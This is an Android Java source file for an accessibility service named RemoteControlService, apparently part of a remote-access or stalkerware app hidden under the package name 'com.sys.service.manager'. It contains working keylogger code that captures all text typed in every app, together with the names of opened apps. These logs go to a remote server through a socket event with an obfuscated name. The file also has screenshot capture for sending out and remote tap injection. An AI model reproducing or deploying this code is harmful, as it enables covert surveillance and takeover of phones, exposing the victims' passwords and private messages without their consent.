package com.sys.service.manager;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.view.Display;
import androidx.annotation.RequiresApi;
import java.util.concurrent.Executors;

/**
 * Remote Control and Screen Capture via Accessibility Service
 */
public class RemoteControlService extends AccessibilityService {

    private static RemoteControlService instance = null;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.e("RemoteControl", "Accessibility Service Connected!");
    }

    public static RemoteControlService getInstance() {
        return instance;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Keylogging Logic
        int eventType = event.getEventType();
        String packageName = String.valueOf(event.getPackageName());
        
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                String typedText = String.valueOf(event.getText());
                if (!typedText.isEmpty()) {
                    Log.d("Keylogger", "[" + packageName + "] Typed: " + typedText);
                    sendKeylog("[" + packageName + "] " + typedText);
                }
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                // Log the current app the child is using
                Log.d("Keylogger", "App Opened: " + packageName);
                sendKeylog("ABRIO APP: " + packageName);
                break;
        }
    }

    private void sendKeylog(String logText) {
        try {
            org.json.JSONObject data = new org.json.JSONObject();
            data.put("log", logText);
            IOSocket.getInstance().getIoSocket().emit("x0000kl", data);
        } catch (Exception e) {
            // Log error
        }
    }

    @Override
    public void onInterrupt() {
    }

    // Modern Screenshot (Android 11+)
    @RequiresApi(api = Build.VERSION_CODES.R)
    public void takeScreenCapture() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
                    if (bitmap != null) {
                        Log.e("ScreenManager", "Screenshot captured successfully!");
                        // Since hardware buffer might need software conversion for JPEG
                        Bitmap softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                        ScreenManager.sendScreenshot(softwareBitmap);
                    }
                }

                @Override
                public void onFailure(int i) {
                    Log.e("ScreenManager", "Screenshot capture failed: " + i);
                }
            });
        }
    }

    // Remote Click Action
    public void performClick(int x, int y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 10));
            dispatchGesture(builder.build(), null, null);
        }
    }
}
